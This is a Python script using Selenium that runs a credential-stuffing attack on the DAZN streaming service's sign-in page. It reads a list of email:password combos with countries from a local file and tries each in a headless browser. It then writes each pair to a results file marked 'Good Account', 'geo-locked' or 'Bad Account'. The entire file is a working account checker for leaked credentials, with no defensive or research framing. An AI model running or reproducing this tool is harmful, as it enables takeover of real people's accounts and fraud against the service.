import time
from dazn_header import header
from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from pathlib import Path
header()
file_directory = str(Path(__file__).parent)+'/dazn'
page = 'https://www.dazn.com/en-GB/signin'
info_list =[]
users = []
passwords = []
countries = []
browser_options = Options()
browser_options.headless = True

with open(file_directory, 'r') as dazn:
	for line in dazn.readlines():
		try:
			users.append(line.split(':')[0].strip())
			passwords.append(line.split(':')[1].split(' | ')[0].strip())
			countries.append(line.split(' | ')[1].strip())
		except IndexError:
			continue

for index in range(len(users)):
	with open('account_results','a') as account_results:
		try:
			print('\rTrying Combo {} out of {}'.format(index, len(users)),end='')
			browser = webdriver.Chrome(options = browser_options)
			browser.set_window_size(500,700)
			browser.get(page)
			time.sleep(4)
			gdpr_accept_all = browser.find_element_by_xpath('//*[@id="onetrust-accept-btn-handler"]')
			gdpr_accept_all.click()
			time.sleep(1)
			email_input_box = browser.find_element_by_xpath('//*[@id="email"]')
			password_input_box = browser.find_element_by_xpath('//*[@id="password"]')
			sign_in_button = browser.find_element_by_xpath('//*[@id="root"]/div[1]/main/form/button')
			email_input_box.send_keys(users[index])
			password_input_box.send_keys(passwords[index])
			sign_in_button.click()
			time.sleep(3)			
			invalid_email_text = browser.find_element_by_xpath('/html/body/reach-portal/div[3]/div/div/div/div[1]/span')
			error = invalid_email_text.text
			if 'Your email address and/or password are incorrect' in str(error):
				account_results.write('{}:{} ---> Bad Account\n'.format(users[index],passwords[index]))
				browser.close()
			if 'You can only access DAZN in the country where you created your account' in str(error):
				account_results.write('{}:{} ---> Good Account, geo-locked login ({})\n'.format(users[index], passwords[index], countries[index]))
				browser.close()
		except NoSuchElementException:		
			account_results.write('{}:{} ---> Good Account\n'.format(users[index],passwords[index]))
			browser.close()
			continue

		except Exception as e: #ElementClickInterceptedException:
		
			print(e)			
			continue

browser.close()
